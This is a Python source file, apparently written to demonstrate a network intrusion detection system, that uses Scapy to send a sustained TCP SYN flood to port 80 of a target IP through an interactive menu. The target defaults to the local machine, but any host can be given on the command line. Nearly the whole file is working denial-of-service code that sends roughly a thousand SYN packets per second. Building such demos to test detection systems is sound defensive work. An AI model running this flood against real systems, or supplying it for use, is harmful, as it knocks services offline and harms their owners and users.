#!/usr/bin/env python3
"""
NIDS Demo Attack Script
Focus: SUSTAINED TCP SYN Flood (DoS)
"""

import sys
import time
import random
import argparse

from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether
from scapy.all import sendp, get_if_hwaddr, get_if_addr, conf


def get_mac(iface):
    try:
        return get_if_hwaddr(iface)
    except:
        return "ff:ff:ff:ff:ff:ff"


def attack_syn_flood(target_ip, iface, target_mac, duration=15):
    print(f"\n[>>>] LAUNCHING SUSTAINED TCP SYN FLOOD against {target_ip}...")
    print(f"      Targeting: Port 80")
    print(f"      Strategy: Single-Flow Overload")

    t_end = time.time() + duration
    count = 0
    dst_port = 80

    src_port = random.randint(1024, 65535)

    print(f"      Locking Source Port: {src_port}")

    while time.time() < t_end:
        # Randomize TTL to mimic realistic OS variance
        ttl_val = random.choice([64, 128, 254])

        # Construct Layer 2 Frame
        pkt = Ether(dst=target_mac) / \
              IP(dst=target_ip, ttl=ttl_val) / \
              TCP(sport=src_port, dport=dst_port, flags="S", seq=random.randint(1000, 9000))

        # inter=0.001 -> Pushing for ~1000 packets/sec
        sendp(pkt, iface=iface, verbose=0, inter=0.001)

        count += 1
        if count % 100 == 0:
            sys.stdout.write(".")
            sys.stdout.flush()

    print(f"\n[Done] Attack Complete. Sent {count} SYN packets in a single flow.")


def main():
    parser = argparse.ArgumentParser(description="NIDS Presentation Attacker")
    parser.add_argument("--target", default=None, help="Target IP (defaults to this machine)")
    parser.add_argument("--iface", default=None, help="Interface to send packets from")
    args = parser.parse_args()

    if args.iface:
        iface = args.iface
    else:
        iface = conf.iface

    target_ip = args.target if args.target else get_if_addr(iface)
    target_mac = get_mac(iface)

    print("=" * 60)
    print(f"  NIDS DEMO: SUSTAINED DoS ATTACK")
    print(f"  Interface : {iface}")
    print(f"  Target IP : {target_ip}")
    print("=" * 60)
    print("1. Launch Sustained SYN Flood")
    print("2. Exit")

    while True:
        try:
            choice = input("\nSelect Option [1-2]: ")
            if choice == '1':
                attack_syn_flood(target_ip, iface, target_mac)
            elif choice == '2':
                print("Exiting.")
                break
            else:
                print("Invalid selection.")
        except KeyboardInterrupt:
            break


if __name__ == "__main__":
    main()
